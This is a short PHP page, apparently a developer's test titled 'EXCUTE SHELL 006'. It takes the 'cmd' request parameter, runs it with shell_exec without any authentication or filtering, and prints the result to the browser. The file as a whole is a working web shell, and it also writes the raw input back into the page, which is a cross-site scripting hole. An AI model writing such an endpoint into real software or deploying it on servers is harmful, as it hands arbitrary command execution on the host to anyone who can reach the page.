<?php
include("library.php");  // library.php 파일 포함
defMeta();

$cmd = $_REQUEST['cmd'];

appendWithTag('h1','EXCUTE SHELL 006');

appendWithTag('h2','cmd');
appendWithTag('p',$cmd);

appendWithTag('p',strtoupper(substr(PHP_OS, 0, 3)));


$byte_array = unpack('H*', $cmd);
//var_dump($byte_array);

$byte_array = unpack('H*', 'dir');
//var_dump($byte_array);

//$result = shell_exec ( $cmd );
$result = shell_exec ( $cmd);

$byte_array = unpack('H*', $result);
var_dump($byte_array);



if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
	$result = iconv("EUC-KR", "UTF-8", $result);
} 

appendWithTag('h2','RESULT of shell');
appendWithTag('p',$result);
appendWithTag('h4','END');


$maparray = array(
		"BACK"=> "javascript:history.back()",
);

MakeLink($maparray);